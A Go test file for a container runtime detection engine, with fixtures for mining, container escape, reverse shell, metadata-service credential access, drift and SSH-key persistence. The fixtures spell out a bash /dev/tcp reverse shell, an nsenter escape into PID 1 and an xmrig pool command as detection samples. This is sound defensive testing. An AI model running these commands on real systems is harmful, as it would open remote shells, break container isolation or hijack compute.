package runtime

import (
	"context"
	"testing"
	"time"
)

func TestDetectionEngine_ProcessEvent(t *testing.T) {
	engine := NewDetectionEngine()

	tests := []struct {
		name           string
		event          *RuntimeEvent
		wantFindings   int
		wantCategories []DetectionCategory
	}{
		{
			name: "crypto mining process",
			event: &RuntimeEvent{
				ID:        "test-1",
				Timestamp: time.Now(),
				EventType: "process",
				Process: &ProcessEvent{
					Name:    "xmrig",
					Cmdline: "xmrig --pool stratum://pool.example.com",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryCryptoMining},
		},
		{
			name: "container escape nsenter",
			event: &RuntimeEvent{
				ID:        "test-2",
				Timestamp: time.Now(),
				EventType: "process",
				Process: &ProcessEvent{
					Name:    "nsenter",
					Cmdline: "nsenter -t 1 -m -u -i -n",
				},
				Container: &ContainerEvent{
					ContainerID: "abc123",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryContainerEscape},
		},
		{
			name: "reverse shell bash",
			event: &RuntimeEvent{
				ID:        "test-3",
				Timestamp: time.Now(),
				EventType: "process",
				Process: &ProcessEvent{
					Name:    "bash",
					Cmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryReverseShell},
		},
		{
			name: "imds access",
			event: &RuntimeEvent{
				ID:        "test-4",
				Timestamp: time.Now(),
				EventType: "network",
				Process: &ProcessEvent{
					Name: "curl",
				},
				Network: &NetworkEvent{
					DstIP:   "169.254.169.254",
					DstPort: 80,
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryCredentialAccess},
		},
		{
			name: "legitimate process",
			event: &RuntimeEvent{
				ID:        "test-5",
				Timestamp: time.Now(),
				EventType: "process",
				Process: &ProcessEvent{
					Name:    "nginx",
					Cmdline: "nginx: worker process",
				},
			},
			wantFindings:   0,
			wantCategories: nil,
		},
		{
			name: "container drift new binary",
			event: &RuntimeEvent{
				ID:        "test-6",
				Timestamp: time.Now(),
				EventType: "file",
				File: &FileEvent{
					Operation: "create",
					Path:      "/usr/bin/malware.elf",
				},
				Container: &ContainerEvent{
					ContainerID: "abc123",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryContainerDrift},
		},
		{
			name: "ssh keys modified",
			event: &RuntimeEvent{
				ID:        "test-7",
				Timestamp: time.Now(),
				EventType: "file",
				File: &FileEvent{
					Operation: "modify",
					Path:      "/root/.ssh/authorized_keys",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryPersistence},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := engine.ProcessEvent(context.Background(), tt.event)

			if len(findings) != tt.wantFindings {
				t.Errorf("got %d findings, want %d", len(findings), tt.wantFindings)
			}

			for i, cat := range tt.wantCategories {
				if i < len(findings) && findings[i].Category != cat {
					t.Errorf("finding %d category = %s, want %s", i, findings[i].Category, cat)
				}
			}
		})
	}
}

func TestDetectionEngine_ListRules(t *testing.T) {
	engine := NewDetectionEngine()
	rules := engine.ListRules()

	if len(rules) == 0 {
		t.Error("expected default rules to be loaded")
	}

	// Check for critical rule categories
	categories := make(map[DetectionCategory]bool)
	for _, rule := range rules {
		categories[rule.Category] = true
	}

	requiredCategories := []DetectionCategory{
		CategoryCryptoMining,
		CategoryContainerEscape,
		CategoryReverseShell,
		CategoryLateralMovement,
		CategoryCredentialAccess,
	}

	for _, cat := range requiredCategories {
		if !categories[cat] {
			t.Errorf("missing rules for category: %s", cat)
		}
	}
}

func TestDetectionEngine_Suppression(t *testing.T) {
	engine := NewDetectionEngine()

	// Get a rule ID
	rules := engine.ListRules()
	if len(rules) == 0 {
		t.Skip("no rules loaded")
	}

	ruleID := rules[0].ID

	// Set suppression
	engine.SetSuppression(ruleID, true)

	// Create event that would trigger the rule
	event := &RuntimeEvent{
		ID:        "test-suppressed",
		Timestamp: time.Now(),
		EventType: "process",
		Process: &ProcessEvent{
			Name:    "xmrig",
			Cmdline: "xmrig",
		},
	}

	findings := engine.ProcessEvent(context.Background(), event)

	// Check that findings are marked as suppressed
	for _, f := range findings {
		if f.RuleID == ruleID && !f.Suppressed {
			t.Error("expected finding to be marked as suppressed")
		}
	}
}
